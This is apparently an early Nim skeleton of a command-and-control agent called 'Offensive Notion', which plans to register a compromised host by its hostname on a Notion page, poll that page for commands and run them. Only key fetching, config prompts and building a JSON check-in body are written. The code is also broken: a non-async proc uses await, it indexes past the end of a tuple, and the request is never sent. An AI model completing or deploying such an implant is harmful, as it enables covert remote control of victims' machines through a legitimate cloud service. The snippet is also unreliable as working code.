import std/[
    json,
    asyncdispatch,
    strformat, 
    terminal
]
import system
import parseutils
import os
import nativesockets
import httpclient

#[
    Things we need to do:
    Load the API key*
    Start comms by making a new page*
    Sleep* 
    Get new blocks*
    Any new commands?*
    Do em*
]#

const URL_BASE = "https://api.notion.com/v1"
const API_KEY_URL = "http://localhost:8888/api.txt"

proc getConfigOptions(): tuple =
    #[  
        This procedure represents everything we would want to pull in from a config file at compile time.
        TODO: look into TOML/YAML parsing
    ]#
    echo "[*] Enter agent sleep interval > "
    let SLEEP_INTERVAL = readLine(stdin)

    echo "[*] Enter the ID of the parent page > "
    let PARENT_PAGE = readLine(stdin)

    return (SLEEP_INTERVAL, PARENT_PAGE)


# Create Agent Check-in Page
proc createPage(headers: array[0..1, (string, string)], configs: tuple): void =
    let hostname = getHostname()
    let url = fmt"{URL_BASE}/pages/"

    # Craft JSON body
    var body = %*
        [
            { 
            "parent":{
                "type": "page_id",
                "page_id": fmt"{configs[1]}" 
                },
                "properties": {
                "title":[{
                    "text": {
                        "content": hostname
                        }
                }]
                }
            }
        ]
    echo "[*] JSON body:"
    echo body
    # Craft JSON request

proc getApiKey(url: string): Future[string] {.async.} =
    let client = newAsyncHttpClient()
    let r = await client.get(url)
    result = await r.body

# Get new blocks*

# Any new commands?

# Do em*


proc main(): void =
    echo "[*] Offensive Notion! Because Reasons!"

    let NOTION_API_KEY: string = await getApiKey(API_KEY_URL)

    if NOTION_API_KEY != "":
        echo "GOT THE API KEY"
    
    let configs = getConfigOptions()
    let headers = {
        "Notion-Version": "2021-08-16",
        "Content-Type": "application/json",
        "Authorization": fmt"Bearer {configs[2]}"
    }
    # createPage(headers, configs)


when isMainModule:
    main()